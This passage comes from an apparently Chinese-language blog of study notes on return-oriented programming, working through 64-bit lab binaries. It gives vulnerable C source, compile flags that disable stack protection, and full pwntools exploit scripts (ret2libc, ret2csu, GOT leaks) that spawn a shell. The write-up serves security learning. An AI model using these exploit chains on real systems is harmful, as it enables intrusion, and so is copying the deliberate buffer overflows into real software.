p32(execve_addr) + p32(vulfun_addr) + p32(bss_base) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>本地环境中system()函数执行有问题，老得不到shell，换了execve()函数即可：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/19.png" alt=""></p>
<h2 id="0x02-64位ROP"><a href="#0x02-64位ROP" class="headerlink" title="0x02 64位ROP"></a>0x02 64位ROP</h2><h3 id="level3——64位与32位区别"><a href="#level3——64位与32位区别" class="headerlink" title="level3——64位与32位区别"></a>level3——64位与32位区别</h3><blockquote>
<p>linux_64与linux_86的区别主要有两点：<strong>首先是内存地址的范围由32位变成了64位</strong>。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。<strong>其次是函数参数的传递方式发生了改变</strong>，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
</blockquote>
<p>level3.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认打开系统的ASLR，然后用如下gcc命令编译，即不开启Canary：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level3.c -o level3</span><br></pre></td></tr></table></figure>
<p>查看基本功能和安全编译选项开关：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/20.png" alt=""></p>
<p>通过GDB的调试，用pattern创建大量字符串发送过去，程序终止在vulnerable_function()函数处：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/21.png" alt=""></p>
<blockquote>
<p>奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/22.png" alt=""></p>
<p>因此我们得到了136的偏移地址。</p>
<p>我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "A"*136+"ABCDEF\x00\x00"'</span> &gt; payload</span><br><span class="line">gdb level3</span><br><span class="line">(gdb) r &lt; payload</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/23.png" alt=""></p>
<p>可以看到我们已经成功的控制了PC的指针了。</p>
<p>知道了偏移量，且程序中本来就存在一个callsystem()函数，其会直接调用system(“/bin/sh”)，那就简单多了。</p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">callsystem_addr = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]callsystem() addr: "</span> + hex(callsystem_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(callsystem_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/24.png" alt=""></p>
<h3 id="level4——使用工具寻找gadgets"><a href="#level4——使用工具寻找gadgets" class="headerlink" title="level4——使用工具寻找gadgets"></a>level4——使用工具寻找gadgets</h3><blockquote>
<p>我们之前提到x86中参数都是保存在栈上，但在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p>
<p><strong>ROPEME</strong>: <a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">https://github.com/packz/ropeme</a></p>
<p><strong>Ropper</strong>: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></p>
<p><strong>ROPgadget</strong>: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSa…</a></p>
<p><strong>rp++</strong>: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p>
<p>这些工具功能上都差不多，找一款自己能用的惯的即可。</p>
</blockquote>
<p>level4.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译，因为程序用到了dlopen()函数打开libc，因此需要-ldl参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure>
<p>64位程序，动态链接文件，只开启了NX：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/25.png" alt=""></p>
<p>用IDA分析，看到程序在一开始运行时调用systemaddr()函数，该函数会从本程序用到的libc.so.6中获取其中的system()函数地址并打印出来：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/26.png" alt=""></p>
<p>和level3一样得到溢出偏移量为136。</p>
<p>下面开始使用工具来寻找合适的Gadgets。</p>
<p>因为我们知道了溢出偏移量和system()函数的地址，剩下的就是通过寄存器给system()函数传参了，而在64位中传参的前六个参数是通过寄存器来实现的，而且system()只接受一个参数，因此我们需要找到一条pop rdi;ret的Gadget来帮助我们实现，这里我们用的是ROPgadget工具帮我们查找：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/27.png" alt=""></p>
<p>当然，一般情况下自身的程序可能没有合适的Gadgets，这时我们可以到指定的libc.so文件中找到合适的：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/29.png" alt=""></p>
<p>编写payload，有两个Gadget可选，如果用的是libc中的Gadget则需要加上libc的实际地址来计算出该gadget的实际地址，因为libc.address = offset = system_addr - libc.symbols[‘system’] = gadget实际地址 - gadget在libc中地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">## self gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = 0x00000000004008b3</span></span><br><span class="line"><span class="comment">## libc gadget</span></span><br><span class="line">pop_rdi_ret_libc = <span class="number">0x0000000000021102</span></span><br><span class="line"></span><br><span class="line">system_addr = int(p.recv(<span class="number">1024</span>).split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]recv system() addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc.address = system_addr - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="comment">## libc gadget + libc addr</span></span><br><span class="line">pop_rdi_ret_addr = pop_rdi_ret_libc + libc.address</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh libc addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/28.png" alt=""></p>
<p>除了前面找的pop rdi;ret这个Gadget，我们还可以找另外一个gadget，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链，如下：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/30.png" alt=""></p>
<p>可以看到pop rax;pop rdi;call rax这个gadget，我们可以先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop|ret</span></span><br><span class="line"><span class="comment">## self gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = 0x00000000004008b3</span></span><br><span class="line"><span class="comment">## libc gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_libc = 0x0000000000021102</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop|call</span></span><br><span class="line">pop_call_libc = <span class="number">0x0000000000107419</span></span><br><span class="line"></span><br><span class="line">system_addr = int(p.recv(<span class="number">1024</span>).split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]recv system() addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc.address = system_addr - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = pop_rdi_ret_libc + libc.address</span></span><br><span class="line">pop_call_addr = pop_call_libc +libc.address</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh libc addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "A" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level5——通用gadgets"><a href="#level5——通用gadgets" class="headerlink" title="level5——通用gadgets"></a>level5——通用gadgets</h3><blockquote>
<p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p>
</blockquote>
<p>level5.c代码如下，相比于level3和level4，去掉了提供system()或其地址的辅助函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段，最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
</blockquote>
<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o level5 level5.c</span><br></pre></td></tr></table></figure>
<p>基本功能和安全编译开关和前面的一致。</p>
<p>溢出偏移量也和之前的一致，为136。</p>
<p>用objdump -d ./level5观察一下__libc_csu_init()这个函数：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/31.png" alt=""></p>
<p>可以看到，利用0x40061a处的代码可以控制rbx、rbp、r12、r13、r14和r15的值，<strong>随后利用0x400600处的代码可以将r13的值赋值给rdx、r14的值赋值给rsi、r15的值赋值给edi（这和蒸米原文的顺序是相反的，因为本地编译出来的程序所用的gadget有些许区别，其实这里利用的就是ret2csu技巧）</strong>，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
<p>这里列两种getshell的方法。</p>
<h4 id="Method1——只用ret2csu的Gadget"><a href="#Method1——只用ret2csu的Gadget" class="headerlink" title="Method1——只用ret2csu的Gadget"></a>Method1——只用ret2csu的Gadget</h4><p>第一种是蒸米讲解的方法，即利用该gadget构造3段payload，分别是泄露write()函数地址、向程序.bss段写入”/bin/sh”和system()或execve()函数地址、传入bss_addr+8处的参数并调用bss_addr地址处的函数即执行system(“/bin/sh”)。</p>
<p>最终exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment">#p = remote('192.168.17.155',10001)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(got_write)</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]read() got: "</span> + hex(got_read)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">	<span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">	<span class="comment"># rbx should be 0,</span></span><br><span class="line">	<span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">	<span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">	<span class="comment"># rdi=edi=r15d</span></span><br><span class="line">	<span class="comment"># rsi=r14</span></span><br><span class="line">	<span class="comment"># rdx=r13</span></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(gadget2)</span><br><span class="line">	payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">	payload += p64(ret)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 = csu(<span class="number">0</span>, <span class="number">1</span>, got_write, <span class="number">8</span>, got_write, <span class="number">1</span>, main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">execve_addr = libc.symbols[<span class="string">"execve"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]execve() addr: "</span> + hex(execve_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 = csu(<span class="number">0</span>, <span class="number">1</span>, got_read, <span class="number">16</span>, bss_addr, <span class="number">0</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(execve_addr))</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(rdi = bss_addr+8 = "/bin/sh", rsi=0, rdx=0)</span></span><br><span class="line">payload3 = csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, <span class="number">0</span>, <span class="number">0</span>, bss_addr + <span class="number">8</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload3#############\n"</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>简单说下：</p>
<ul>
<li>由于利用到泄露函数地址和向.bss段写内容的功能，需要先获取write()和read()函数的GOT地址；</li>
<li>本次利用的Gadget即ret2csu，定义一个csu函数，用于构造Gadget传参构造payload，其中payload构造是先填充溢出偏移量的字符、然后根据gadget1来设置对应寄存器的值、再调用gadget2、然后填充字符至gadget1的ret指令处、最后调用输入的返回地址即main处让程序继续执行下去；这里注意两个偏移量，第一个136是程序本身溢出到ret的偏移量，而第二个56则是gadget2跑完之后还要继续往下跑到gadget1的ret中去，这中间需要填充56个字节；</li>
<li>payload1利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止；</li>
<li>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着构造payload2，利用read()将system()或execve()的地址以及“/bin/sh”读入到.bss段内存中；</li>
<li>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</li>
</ul>
<p>在我的本地环境中，利用system()的exp会得不到shell，换了execve()才可以：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/32.png" alt=""></p>
<h4 id="Method2——利用两个Gadgets"><a href="#Method2——利用两个Gadgets" class="headerlink" title="Method2——利用两个Gadgets"></a>Method2——利用两个Gadgets</h4><p>其实不用向.bss段写内容再调用，有点繁琐，且同一个Gadget调用了3次。</p>
<p>除了利用ret2csu的gadget，这里还利用到pop rdi|ret这个gadget，主要用于给system(函数的第一个参数赋值并返回往下调用system()函数从而getshell：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/33.png" alt=""></p>
<p>基本利用过程就是：通过ret2csu的gadget泄露write()函数的真实地址，通过LibcSearcher或查询的方式得到libc的offset然后计算出system()函数和”/bin/sh”的真实地址，最后利用pop rdi|ret这个gadget构造exp执行system(“/bin/sh”)。</p>
<p>payload如下，下面将改为远程连接的形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 